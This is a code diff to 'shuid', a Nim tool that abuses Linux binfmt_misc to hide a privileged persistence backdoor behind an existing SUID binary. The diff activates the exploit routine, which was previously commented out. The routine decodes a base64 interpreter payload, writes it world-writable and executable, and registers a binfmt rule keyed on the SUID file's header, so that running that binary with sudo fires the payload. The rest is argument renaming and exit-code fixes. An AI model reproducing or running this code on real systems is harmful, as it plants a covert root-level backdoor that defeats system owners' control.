@@ -3,6 +3,7 @@ import osproc
 import os
 import std/posix_utils
 import std/strutils
+import std/base64
 import streams
 import terminal
 
@@ -12,7 +13,7 @@ const RULE_NAME {.strdefine.}: string = ".shuid"
 
 const ELF_HEADER = ['\x7F', 'E', 'L', 'F', '\x02', '\x01', '\x01', '\x00']
 const HEADER_SIZE = 8
-const MAGIC_SIZE = 126
+const MAGIC_SIZE = 128
 
 const SUID_PERM = 0o4000
 const EXEC_PERM = 0o100
@@ -58,7 +59,7 @@ proc checkBinfmt(privesc:bool):bool=
     let isRegisterWritable = execCmdEx("test -w /proc/sys/fs/binfmt_misc/register").exitCode
     if isRegisterWritable!=0:
       styledEcho("❌ /proc/sys/fs/binfmt_misc/register ",fgRed," is not writable by user")
-      #TODO: Provide a way to the user to specify another way to write into register (e.g /usr/lin/toto/register is writable)
+      #TODO: Provide a way to the user to specify another way to write into register (e.g /usr/lib/toto/register is writable)
       return false
 
   return true
@@ -69,9 +70,9 @@ proc isSETUID*(m: Mode,s=""): bool =
   let m = m.uint and 4095
   result = (m and SUID_PERM) != 0 and (m and EXEC_PERM) != 0
 
-proc searchSuid(dir, file: string,chooseFile: bool): string=
+proc searchSuid(dir, file: string,chooseSuid: bool): string=
   ## Find SUID fiels in a given directory. if file is filled nothing is done
-  ## - chooseFile parameter make the user chose the file (user input)
+  ## - chooseSuid parameter make the user chose the file (user input)
   ## - otherwise the suid file is chosen randomly
   
   if file != "": return file
@@ -88,7 +89,7 @@ proc searchSuid(dir, file: string,chooseFile: bool): string=
     else: discard
   
   if suids.len == 0: return ""
-  if chooseFile:
+  if chooseSuid:
     styledEcho(fgBlue, "Specify which suid file to use to hide the shadow suid:")
     for idx, file in suids[0 .. ^1]:
       echo "\t",idx,": ",file
@@ -102,40 +103,51 @@ proc searchSuid(dir, file: string,chooseFile: bool): string=
   elif suids.len > 0 : return suids[^1]
   return ""
 
-proc exploit(registerPath, suidPath, interpreter: string): void=
+proc exploit(registerPath, suidPath, interpreterB64: string): void=
   ## Exploit BIN_FMT feature to register a new type of executable
   ## - check that suid is an ELF binary
   ## - create interpreter
   ## - register the interpreter
   
-  # # read header of suid file(for magic_number)
-  # let stream = newFileStream(suidPath, mode = fmRead)
-  # defer: stream.close()
-  # # Check magic string
-  # var magicNumber: array[HEADER_SIZE, char]
-  # discard stream.readData(magicNumber.addr, HEADER_SIZE) 
-  # if magicNumber != ELF_HEADER:
-  #   styledEcho("❌ SUID file, ",suidPath,fgRed," is not an ELF binary")
-  #   quit(QuitSuccess)
+  # read header of suid file(for magic_number)
+  let stream = newFileStream(suidPath, mode = fmRead)
+  defer: stream.close()
+  # Check magic string
+  var magicNumber: array[HEADER_SIZE, char]
+  discard stream.readData(magicNumber.addr, HEADER_SIZE) 
+  if magicNumber != ELF_HEADER:
+    styledEcho("❌ SUID file, ",suidPath,fgRed," is not an ELF binary")
+    quit(QuitFailure)
 
-  # # retrieve interpreter (from now it is done at compilation time)
-  # # write interpreter in fs
-  # writeFile(INTERPRETER_PATH, interpreter)
-  # setFilePermissions(INTERPRETER_PATH, {fpUserWrite, fpUserRead, fpUserExec})
-  # # register interpreter
-  # stream.setPosition(0)
-  # var headerSuidHex,registerLine: string
-  # for i in 1..128:
-  #   headerSuidHex &= "\\x"&toHex($(stream.readChar()))
-  # registerLine= ":$1:M::$2::$3:C" % [RULE_NAME, headerSuidHex, INTERPRETER_PATH]
+  # retrieve interpreter (from now it is done at compilation time)
+  # write interpreter in fs
+  var interpreter = decode(interpreterB64)
+  writeFile(INTERPRETER_PATH, interpreter)
+  setFilePermissions(INTERPRETER_PATH, {fpUserWrite, fpUserRead, fpUserExec,fpOthersExec,fpOthersRead,fpOthersWrite})
+  styledEcho("✍️ Write interpreter in: ",fgCyan,INTERPRETER_PATH)
+  # register interpreter
+  stream.setPosition(0)
+  var headerSuidHex,registerLine: string
+  for i in 1..MAGIC_SIZE:
+    headerSuidHex &= "\\x"&toHex($(stream.readChar()))
+  registerLine= ":$1:M::$2::$3:C" % [RULE_NAME, headerSuidHex, INTERPRETER_PATH]
   # writeFile(BINFMT_DIR & RULE_NAME, "1")
-  # writeFile(registerPath, registerLine)
+  try: writeFile(registerPath, registerLine)
+  except IOError:
+    styledEcho("❌ It seeams that you are ",fgRed,"not authorized to write in ", registerPath)
+    styledEcho(fgblue,"~> Try running shuid with sudo")
+    removeFile(INTERPRETER_PATH)
+    quit(QuitFailure)
+
+  writeFile(registerPath, registerLine)
+  styledEcho("🗒️ Register interpreter in: ",fgCyan, BINFMT_DIR & RULE_NAME)
+
   
 
   # BOOM!
   echo("🌒  binfmt has been exploited to maintain privileged persistence.")
-  echo "\e[2mWelcome in the shadow. Command that will trigger the persistence command:"
-  styledEcho("😈 Command that will trigger the persistence command ", bgRed, "sudo ", suidPath, fgBlack)
+  styledEcho(styleDim,"\nWelcome in the shadow") 
+  styledEcho(styleDim,"😈 Command that will trigger the persistence command ", bgRed, "sudo ", suidPath, fgBlack)
 
 
 proc shuid(
@@ -143,7 +155,7 @@ proc shuid(
   check = true, 
   file = "", 
   searchDir="/bin", 
-  chooseFile = false,
+  chooseSuid = false,
   noExec=false
   ): void =
   ## shuid is define command line arguments to perform shadow suid file
@@ -155,14 +167,14 @@ proc shuid(
   if check:
     if checkBinfmt(privesc):
       styledEcho("✔️ binfmt kernel feature is",fgGreen," enabled")
-    else: quit(QuitSuccess)
+    else: quit(QuitFailure)
 
   # Search SUID file to hide our payload
-  let suid = searchSuid(searchDir,file,chooseFile)
+  let suid = searchSuid(searchDir,file,chooseSuid)
   if suid != "": styledEcho("🎯 SUID target file: ",fgCyan,suid)
   else:
     styledEcho("❌ No SUID file in ",fgRed,searchDir)
-    quit(QuitSuccess)
+    quit(QuitFailure)
 
   exploit(REGISTER_PATH,suid,INTERPRETER_CONTENT)
 
@@ -171,6 +183,6 @@ when isMainModule:
   "check": "perform exploit requirement checks",
   "file": "SUID file to use",
   "searchDir": "directory use to find SUID file",
-  "chooseFile": "choose SUID file to use from the list (if not taken randomly)",
+  "chooseSuid": "choose SUID file to use from the list (if not taken randomly)",
   "noExec": "do not exec SUID file"
   }
